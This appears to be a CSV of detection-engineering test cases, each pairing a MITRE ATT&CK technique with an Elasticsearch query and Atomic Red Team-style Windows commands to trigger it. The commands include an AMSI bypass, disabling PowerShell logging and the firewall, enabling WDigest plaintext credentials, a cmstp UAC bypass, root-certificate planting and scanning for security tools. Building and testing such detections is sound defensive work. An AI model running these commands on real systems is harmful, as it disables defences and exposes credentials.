T1497.003,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match"": {""CommandLine"": ""sleep""}},
                {""match_phrase"": {""CommandLine"": ""sleep.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",sleep 60,2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""System.Management.Automation.AmsiUtils""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""*.GetType""}},
                        {""wildcard"":{""CommandLine"": ""*.GetField""}},
                        {""wildcard"":{""CommandLine"": ""*.SetValue""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",2(4)
T1562.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Remove-Item""}},
                {""match_phrase"": {""CommandLine"": ""Microsoft\\AMSI\\Providers""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse",2(4)
T1112,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                 {""bool"":{
                    ""should"":[
                        {""match_phrase"": {""CommandLine"": ""reg add""}},
                        {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}}
                        ]
                    }
                },
                {""bool"":{
                    ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Windows\\CurrentVersion\\Policies\\Explorer""}}
                        ]
                    }
                },
               {""bool"":{
                   ""should"":[
                        {""wildcard"": {""CommandLine"": ""NoClose*""}},
                        {""wildcard"":{""CommandLine"": ""NoControlPanel*""}},
                        {""wildcard"": {""CommandLine"": ""NoDesktop*""}},
                        {""wildcard"":{""CommandLine"": ""NoFileMenu*""}},
                        {""wildcard"":{""CommandLine"": ""NoFind*""}},
                        {""wildcard"":{""CommandLine"": ""NoPropertiesMyDocuments*""}},
                        {""wildcard"":{""CommandLine"": ""NoRun*""}},
                        {""wildcard"":{""CommandLine"": ""NoSetTaskbar*""}},
                        {""wildcard"":{""CommandLine"": ""NoTrayContextMenu*""}},
                        {""wildcard"":{""CommandLine"": ""NoLogOff*""}},
                        {""wildcard"":{""CommandLine"": ""StartMenuLogOff*""}},
                        {""wildcard"":{""CommandLine"": ""HideClock*""}},
                        {""wildcard"":{""CommandLine"": ""HideSCAHealth*""}},
                        {""wildcard"":{""CommandLine"": ""HideSCANetwork*""}},
                        {""wildcard"":{""CommandLine"": ""HideSCAPower*""}},
                        {""wildcard"":{""CommandLine"": ""HideSCAVolume*""}}
                        ]
                   }
             }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFind /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSetTaskbar /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoTrayContextMenu /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoLogOff /t REG_DWORD /d 1 /f 
&& reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v StartMenuLogOff /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideClock /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAHealth /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCANetwork /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAPower /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAVolume /t REG_DWORD /d 1 /f",2
T1112,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                 {""bool"":{
                    ""should"":[
                        {""match_phrase"": {""CommandLine"": ""reg add""}},
                        {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}}
                        ]
                    }
                },
                {""bool"":{
                    ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Policies\\Microsoft\\Windows\\PowerShell""}}
                        ]
                    }
                },
               {""bool"":{
                   ""should"":[
                        {""wildcard"": {""CommandLine"": ""EnableModuleLogging*""}},
                        {""wildcard"":{""CommandLine"": ""EnableScriptBlockLogging*""}},
                        {""wildcard"": {""CommandLine"": ""EnableTranscripting*""}},
                        {""wildcard"":{""CommandLine"": ""EnableScripts*""}}
                        ]
                   }
             }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f 
&& reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f 
&& reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f 
&& reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f 
&& reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1",2
T1070.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""net share""}},
                {""match_phrase"": {""CommandLine"": ""net use""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net use c: \\test\share 
&& net share test=\\test\share /REMARK:""test share"" /CACHE:No",2
T1553.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-CimMethod""}},
                        {""match_phrase"": {""CommandLine"": ""root/default""}},
                        {""match_phrase"": {""CommandLine"": ""Microsoft\\SystemCertificates\\ROOT\\Certificates""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""CreateKey""}},
                        {""match"":{""CommandLine"": ""SetBinaryValue""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$CertThumbprint = '1F3D38F280635F275BE92B87CF83E40E40458400'
$EncodedCertBlob = '....'

Invoke-CimMethod -Namespace root/default -ClassName StdRegProv -MethodName CreateKey -Arguments @{
    hDefKey = [UInt32] 2147483650 # HKLM
    sSubKeyName = ""SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\$CertThumbprint""
}

Invoke-CimMethod -Namespace root/default -ClassName StdRegProv -MethodName SetBinaryValue -Arguments @{
    hDefKey = [UInt32] 2147483650 # HKLM
    sSubKeyName = ""SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\$CertThumbprint""
    sValueName = 'Blob'
    uValue = [Convert]::FromBase64String($EncodedCertBlob)
}",2(4)
T1562.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                       {""match"": {""CommandLine"": ""reg""}},
                         {""match"": {""CommandLine"": ""Set-ItemProperty""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""netsh* advfirewall""}},
                        {""match_phrase"": {""CommandLine"": ""New-NetFirewallRule""}}
      ]
     }
    }, {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""add rule""}},
                        {""match_phrase"": {""CommandLine"": ""set rule""}},
                        {""match_phrase"": {""CommandLine"": ""set currentprofile state off""}},
                        {""match_phrase"":{""CommandLine"": ""f7ce09_AtomicTest.exe""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Copy-Item f7ce09_AtomicTest.exe -Destination ""C:\Users\$env:UserName"" -Force; 
netsh advfirewall firewall add rule name=""Atomic Test"" dir=in action=allow program=""C:\Users\$env:UserName\AtomicTest.exe"" enable=yes

netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes 
&& netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes

netsh advfirewall set currentprofile state off

netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any

netsh advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=TCP localport=450",2
T1070.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Clear-History""}},
                {""term"": {""CommandLine"": ""clear""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Clear-History;Clear,4
T1112,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""bool"":{
                    ""should"":[
                        {""match_phrase"": {""CommandLine"": ""reg add""}},
                        {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}}
                        ]
                    }
                },
                {""bool"":{
                    ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Windows\\CurrentVersion\\Policies\\System""}},
                        {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\FileSystem""}},
                        {""match_phrase"": {""CommandLine"": ""CurrentVersion\\Internet Settings\\ZoneMap""}},
                        {""match_phrase"": {""CommandLine"": ""Policies\\Microsoft\\Windows""}}
                        ]
                    }
                },
                {""bool"":{
                    ""should"":[
                        {""wildcard"": {""CommandLine"": ""LocalAccountTokenFilterPolicy*""}},
                        {""wildcard"":{""CommandLine"": ""EnableLinkedConnections*""}},
                        {""wildcard"": {""CommandLine"": ""LongPathsEnabled*""}},
                        {""wildcard"": {""CommandLine"": ""http*""}},
                        {""wildcard"": {""CommandLine"": ""DisableCMD*""}},
                        {""wildcard"": {""CommandLine"": ""DisableChangePassword*""}},
                        {""wildcard"": {""CommandLine"": ""DisableLockWorkstation*""}},
                        {""wildcard"": {""CommandLine"": ""DisableNotificationCenter*""}},
                        {""wildcard"": {""CommandLine"": ""shutdownwithoutlogon*""}},
                        {""wildcard"": {""CommandLine"": ""DisableTaskmgr*""}},
                        {""wildcard"": {""CommandLine"": ""DisableRegistryTools*""}}
                        ]
                    }
                }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f 
&& cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f 
&& cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f

New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force; 
New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force; 
New-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem"" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force

$key= ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\""; 
$name =""bad-subdomain""; 
new-item $key -Name $name -Force; 
new-itemproperty $key$name -Name https -Value 2 -Type DWORD; 
new-itemproperty $key$name -Name http  -Value 2 -Type DWORD; 
new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;

New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableChangePassword /t REG_DWORD /d 1 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableLockWorkstation /t REG_DWORD /d 1 /f

reg add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f

reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskmgr /t REG_DWORD /d 1 /f

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f

reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f","2(4)
powershell指令依然测不到"
T1112,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                 {""bool"":{
                    ""should"":[
                        {""match_phrase"": {""CommandLine"": ""reg add""}},
                        {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}}
                        ]
                    }
                },
                {""bool"":{
                    ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Windows\\CurrentVersion\\Explorer\\Advanced""}},
                        {""match_phrase"": {""CommandLine"": ""Windows\\CurrentVersion\\Run""}},
                        {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\SecurityProviders\\WDigest""}}
                        ]
                    }
                },
               {""bool"":{
                   ""should"":[
                        {""wildcard"": {""CommandLine"": ""HideFileExt*""}},
                        {""wildcard"":{""CommandLine"": ""UseLogonCredential*""}},
                        {""wildcard"": {""CommandLine"": ""SecurityHealth*""}},
                        {""wildcard"":{""CommandLine"": ""ShowInfoTip*""}},
                        {""wildcard"":{""CommandLine"": ""ShowCompColor*""}},
                        {""wildcard"":{""CommandLine"": ""NoPropertiesMyDocuments*""}},
                        {""wildcard"":{""CommandLine"": ""HideSCAVolume*""}}
                        ]
                   }
             }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f

reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f 
&& reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f",2
T1218.003,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"": {""CommandLine"": ""cmstp.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cmstp.exe /s ea6e40_T1218.003.inf

cmstp.exe /s b27341_T1218.003_uacbypass.inf /au",2
T1140,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""-encode""}},
                {""match"": {""CommandLine"": ""-decode""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","copy %windir%\system32\certutil.exe %temp%\tcm.tmp 
&& %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt 
&& %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe

certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt 
&& certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe",2
T1112,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Set-ExecutionPolicy""}},
                {""wildcard"": {""CommandLine"": ""*Bypass""}},
                {""wildcard"": {""CommandLine"": ""*LocalMachine""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine,4
T1497.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Select-Object""}},
                        {""match"": {""CommandLine"": ""foreach""}},
                        {""wildcard"": {""CommandLine"": ""if*""}},
                        {""match"": {""CommandLine"": ""-like""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-Service""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Process""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$securityServices = @(
    ""msmpeng"",
    ""windefend"",
    ""mssense"",
    ""sense"",
    ""microsoft.tri.sensor"",
    ""microsoft.tri.sensor.updater"",
    ""cavp"",
    ""cb"",
    ""carbonblack"",
    ""carbonblackk"",
    ""cbcomms"",
    ""cbstream"",
    ""csfalconservice"",
    ""csfalconcontainer"",
    ""csagent"",
    ""csdevicecontrol"",
    ""csfalconservice"",
    ""xagt"",
    ""xagtnotif"",
    ""fe_avk"",
    ""fekern"",
    ""feelam"",
    ""fewscservice"",
    ""ekrn"",
    ""eguiproxy"",
    ""egui"",
    ""eamonm"",
    ""eelam"",
    ""ehdrv"",
    ""ekrnepfw"",
    ""epfwwfp"",
    ""ekbdflt"",
    ""epfw"",
    ""fsgk32st"",
    ""fswebuid"",
    ""fsgk32"",
    ""fsma32"",
    ""fssm32"",
    ""fnrb32"",
    ""fsaua"",
    ""fsorsp"",
    ""fsav32"",
    ""f-secure gatekeeper handler starter"",
    ""f-secure network request broker"",
    ""f-secure webui daemon"",
    ""fsma"",
    ""fsorspclie+C16nt"",
    ""f-secure gatekeeper"",
    ""f-secure hips"",
    ""fsbts"",
    ""fsni"",
    ""fsvista"",
    ""f-secure filter"",
    ""f-secure recognizer"",
    ""fses"",
    ""fsfw"",
    ""fsdfw"",
    ""fsms"",
    ""fsdevcon""
);

$currentServices = Get-Service | Select-Object -Property Name;
foreach ($svc in $currentServices) {
    foreach ($secSvc in $securityServices) {
        if ($svc.Name -like $secSvc) {
            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;
            Write-Host ""[!] Security service found:"";
            Write-Host ""    Service Name:`t"", $svcDetails.Name;
            Write-Host ""    Display Name:`t"", $svcDetails.DisplayName;
            Write-Host ""    Status:`t`t"", $svcDetails.Status;
            Write-Host """";
        }
    }
}

$forensicProcesses = @(
    ""apimonitor-x64"",
    ""apimonitor-x86"",
    ""autopsy64"",
    ""autopsy"",
    ""autoruns64"",
    ""autoruns"",
    ""autorunsc64"",
    ""autorunsc"",
    ""binaryninja"",
    ""blacklight"",
    ""cff explorer"",
    ""cutter"",
    ""de4dot"",
    ""debugview"",
    ""diskmon"",
    ""dnsd"",
    ""dnspy"",
    ""dotpeek32"",
    ""dotpeek64"",
    ""dumpcap"",
    ""evidence center"",
    ""exeinfope"",
    ""fakedns"",
    ""fakenet"",
    ""ffdec"",
    ""fiddler"",
    ""fileinsight"",
    ""floss"",
    ""gdb"",
    ""hiew32demo"",
    ""hiew32"",
    ""hollows_hunter"",
    ""idaq64"",
    ""idaq"",
    ""idr"",
    ""ildasm"",
    ""ilspy"",
    ""jd-gui"",
    ""lordpe"",
    ""officemalscanner"",
    ""ollydbg"",
    ""pdfstreamdumper"",
    ""pe-bear"",
    ""pebrowse64"",
    ""peid"",
    ""pe-sieve32"",
    ""pe-sieve64"",
    ""pestudio"",
    ""peview"",
    ""ppee"",
    ""procdump64"",
    ""procdump"",
    ""processhacker"",
    ""procexp64"",
    ""procexp"",
    ""procmon"",
    ""prodiscoverbasic"",
    ""py2exedecompiler"",
    ""r2agent"",
    ""rabin2"",
    ""radare2"",
    ""ramcapture64"",
    ""ramcapture"",
    ""reflector"",
    ""regmon"",
    ""resourcehacker"",
    ""retdec-ar-extractor"",
    ""retdec-bin2llvmir"",
    ""retdec-bin2pat"",
    ""retdec-config"",
    ""retdec-fileinfo"",
    ""retdec-getsig"",
    ""retdec-idr2pat"",
    ""retdec-llvmir2hll"",
    ""retdec-macho-extractor"",
    ""retdec-pat2yara"",
    ""retdec-stacofin"",
    ""retdec-unpacker"",
    ""retdec-yarac"",
    ""rundotnetdll"",
    ""sbiesvc"",
    ""scdbg"",
    ""scylla_x64"",
    ""scylla_x86"",
    ""shellcode_launcher"",
    ""solarwindsdiagnostics"",
    ""sysmon64"",
    ""sysmon"",
    ""task explorer"",
    ""task explorer-x64"",
    ""tcpdump"",
    ""tcpvcon"",
    ""tcpview"",
    ""vboxservice"",
    ""win32_remote"",
    ""win64_remotex64"",
    ""windbg"",
    ""windump"",
    ""winhex64"",
    ""winhex"",
    ""winobj"",
    ""wireshark"",
    ""x32dbg"",
    ""x64dbg"",
    ""xwforensics64"",
    ""xwforensics"",
    ""redcloak"",
    ""avgsvc"",
    ""avgui"",
    ""avgsvca"",
    ""avgidsagent"",
    ""avgsvcx"",
    ""avgwdsvcx"",
    ""avgadminclientservice"",
    ""afwserv"",
    ""avastui"",
    ""avastsvc"",
    ""aswidsagent"",
    ""aswidsagenta"",
    ""aswengsrv"",
    ""avastavwrapper"",
    ""bccavsvc"",
    ""psanhost"",
    ""psuaservice"",
    ""psuamain"",
    ""avp"",
    ""avpui"",
    ""ksde"",
    ""ksdeui"",
    ""tanium"",
    ""taniumclient"",
    ""taniumdetectengine"",
    ""taniumendpointindex"",
    ""taniumtracecli"",
    ""taniumtracewebsocketclient64""
);

function Find-ForensicProcesses {
    param (
        $ForensicProcessList
    );
    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;
    foreach ($proc in $CurrentProcesses) {
        foreach ($forensicProc in $ForensicProcessList) {
            if ($proc.name -like $forensicProc) {
                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;
                Write-Host ""[!] Forensic process found: "" $proc.Name;
                Write-Host ""[!] Path: "" $procPath.Path;
            }
        }
    }
}

Find-ForensicProcesses($forensicProcesses);",1
